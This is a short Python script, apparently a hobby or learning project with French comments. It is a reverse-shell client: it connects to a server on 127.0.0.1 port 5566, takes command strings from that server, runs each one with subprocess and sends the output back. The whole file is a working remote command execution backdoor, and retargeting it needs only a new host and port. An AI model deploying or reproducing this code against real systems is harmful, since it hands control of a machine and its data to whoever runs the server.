#!/usr/bin/python3
print("""\n\n\n   _____   __  .__.__  .__               
  /  _  \_/  |_|__|  | |__|____    ____  
 /  /_\  \   __\  |  | |  \__  \  /    \ 
/    |    \  | |  |  |_|  |/ __ \|   |  \\
\____|__  /__| |__|____/__(____  /___|  /
        \/                     \/     \/ \n\n\n""")


import socket, subprocess

def test (x):
    t = []
    temp = ""
    for y in x :
        #print (y)
        if (y != " "):
            temp += y
        else:
            print("test")
            t.append(temp)
            temp = ""
    t.append(temp)
    #print(temp)
    return t


#Innitialisation de l'host et du port
host, port = ("127.0.0.1", 5566)

#Innitialisation du socket 
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connection du client au serveur via l'host et le port
socket.connect((host, port))
print("Customer connected")

while True :
    #Recuperation de la command envoyer par le serveur
    stdin = socket.recv(1024)
    #Decodage de la command en utf-8
    stdin = stdin.decode("utf-8")

    if (stdin == "exit()"):
        socket.close()
    
    else:
        stdin2 = test(stdin)
        print (stdin2)
        stdout = str(subprocess.check_output(stdin2))
        stdout = stdout.encode("utf-8")
        socket.send(stdout)



